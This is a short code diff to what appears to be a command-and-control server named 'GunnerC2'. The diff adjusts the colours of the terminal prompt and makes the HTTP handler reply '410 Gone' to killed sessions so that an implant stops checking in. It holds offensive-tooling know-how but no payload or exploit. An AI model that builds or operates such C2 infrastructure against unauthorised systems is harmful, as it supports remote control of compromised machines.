@@ -6,12 +6,13 @@ from core import session_manager, utils
 import random
 import string
 import os,sys,subprocess
+from core.session_manager import kill_http_session
 
 from colorama import init, Fore, Style
-brightgreen = Style.BRIGHT + Fore.GREEN
-brightyellow = Style.BRIGHT + Fore.YELLOW
-brightred = Style.BRIGHT + Fore.RED
-brightblue = Style.BRIGHT + Fore.BLUE
+brightgreen = "\001" + Style.BRIGHT + Fore.GREEN + "\002"
+brightyellow = "\001" + Style.BRIGHT + Fore.YELLOW + "\002"
+brightred = "\001" + Style.BRIGHT + Fore.RED + "\002"
+brightblue = "\001" + Style.BRIGHT + Fore.BLUE + "\002"
 
 PROMPT = brightblue + "GunnerC2 > "
 
@@ -19,6 +20,12 @@ PROMPT = brightblue + "GunnerC2 > "
 class C2HTTPRequestHandler(BaseHTTPRequestHandler):
     def do_GET(self):
         sid = self.headers.get("X-Session-ID")
+
+        if sid and sid in session_manager.dead_sessions:
+            # 410 Gone tells the implant “never come back”
+            self.send_response(410, "Gone")
+            self.end_headers()
+            return
 
         if not sid:
             sid = generate_http_session_id()
